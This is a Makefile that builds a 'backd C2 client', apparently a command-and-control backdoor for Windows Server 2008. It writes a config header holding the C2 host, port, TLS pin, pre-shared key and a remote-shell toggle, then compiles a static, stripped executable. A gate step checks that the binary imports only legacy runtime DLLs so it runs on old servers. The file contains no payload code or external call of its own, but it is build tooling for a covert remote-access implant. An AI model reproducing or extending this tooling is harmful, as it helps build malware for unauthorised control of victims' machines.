# ===========================================================================
#  backd C2 client - Windows Server 2008 x64 (MinGW-w64 / msvcrt, static)
#
#  targets:
#    make gen       regenerate src/generated_config.h from environment
#    make client    compile out/backd-client.exe          (default)
#    make gate      PE import-table gate (no ucrt/vcruntime/libgcc_s)
#    make selftest  run crypto/TLV/base64 self test (via wine on Linux)
#    make loopback  run the BDC2 v1 loopback integration test
#    make all       gen + client + gate
#    make clean
#
#  All addresses/keys come from the environment; no literals in sources:
#    C2_CLIENT_DOMAIN C2_CLIENT_PORT C2_CLIENT_PATH C2_SNI
#    C2_PIN_SHA256 C2_PSK_B64 C2_BUILD_ID
#    C2_MINGW  (default /e/mingw64)     WINEGCC (default wine)
# ===========================================================================

MINGW   ?= /e/mingw64
CC      := $(MINGW)/bin/x86_64-w64-mingw32-gcc.exe
OBJDUMP := $(MINGW)/bin/objdump.exe
WINE    ?= wine

HOST    ?= 127.0.0.1
PORT    ?= 9909
PATH_   ?= /ws
SNI     ?=
PIN     ?=
PSKB64  ?=
BUILDID ?= c2c-1.0
CLIENTID ?= client
ALLOWSHELL ?= 0

SRC := src/main.c src/ws.c src/sha256.c src/aes_gcm.c src/util.c src/json.c \
       src/modules_core.c src/modules_adv.c src/modules_adv2.c
OUT := out
EXE := $(OUT)/backd-client.exe

CFLAGS := -O2 -Wall -Wextra -Wno-unused-parameter -Wno-unused-function \
          -Wno-cast-function-type -Wno-format -Wno-misleading-indentation \
          -D_WIN32_WINNT=0x0600 -DWINVER=0x0600
LDFLAGS := -static -static-libgcc -s -lws2_32 -ladvapi32 -lshell32 -luser32 \
           -lgdi32 -liphlpapi -lshlwapi

.PHONY: all gen client gate selftest loopback clean

all: gen client gate

gen:
	@printf '%s\n' \
	  '/* AUTO-GENERATED by Makefile - do not edit */' \
	  '#ifndef C2_GENERATED_CONFIG_H' \
	  '#define C2_GENERATED_CONFIG_H' \
	  '#define C2_CLIENT_HOST "$(HOST)"' \
	  '#define C2_CLIENT_PORT $(PORT)' \
	  '#define C2_CLIENT_PATH "$(PATH_)"' \
	  '#define GEN_SERVER_HOST C2_CLIENT_HOST' \
	  '#define GEN_SERVER_PORT "$(PORT)"' \
	  '#define GEN_SERVER_PATH C2_CLIENT_PATH' \
	  '#define GEN_SNI "$(SNI)"' \
	  '#define GEN_PIN_SHA256 "$(PIN)"' \
	  '#define GEN_PSK_B64 "$(PSKB64)"' \
	  '#define GEN_CLIENT_ID "$(CLIENTID)"' \
	  '#define GEN_ALLOW_SHELL $(ALLOWSHELL)' \
	  '#define C2_BUILD_ID "$(BUILDID)"' \
	  '#define GEN_BUILD_ID C2_BUILD_ID' \
	  '#endif' > src/generated_config.h
	@echo "[gen] src/generated_config.h host=$(HOST):$(PORT)$(PATH_)"

client: gen
	@mkdir -p $(OUT)
	$(CC) $(CFLAGS) $(SRC) -o $(EXE) $(LDFLAGS)
	@ls -l $(EXE)

gate:
	@$(OBJDUMP) -p $(EXE) > $(OUT)/imports.txt
	@$(OBJDUMP) -p $(EXE) | grep -i 'DLL Name' > $(OUT)/imports_dlls.txt || true
	@if grep -Ei 'api-ms-win|ucrtbase|vcruntime|libgcc_s|msvcp' $(OUT)/imports_dlls.txt; then \
		echo '[gate] FAIL - forbidden runtime imports'; exit 1; fi
	@if ! grep -qi 'msvcrt.dll' $(OUT)/imports_dlls.txt; then \
		echo '[gate] WARN - msvcrt.dll not imported'; else echo '[gate] msvcrt.dll present'; fi
	@ver=$$(grep -i MajorSubsystemVersion $(OUT)/imports.txt | awk '{print $$2}'); \
	 echo "[gate] MajorSubsystemVersion=$$ver"; \
	 if [ "$$ver" -gt 6 ]; then echo '[gate] FAIL - newer than 2008 (6.0)'; exit 1; fi
	@echo '[gate] PASS'
	@cat $(OUT)/imports_dlls.txt

selftest:
	$(WINE) $(EXE) --selftest

loopback:
	cd .. && python loopback_test.py

clean:
	rm -rf $(OUT)
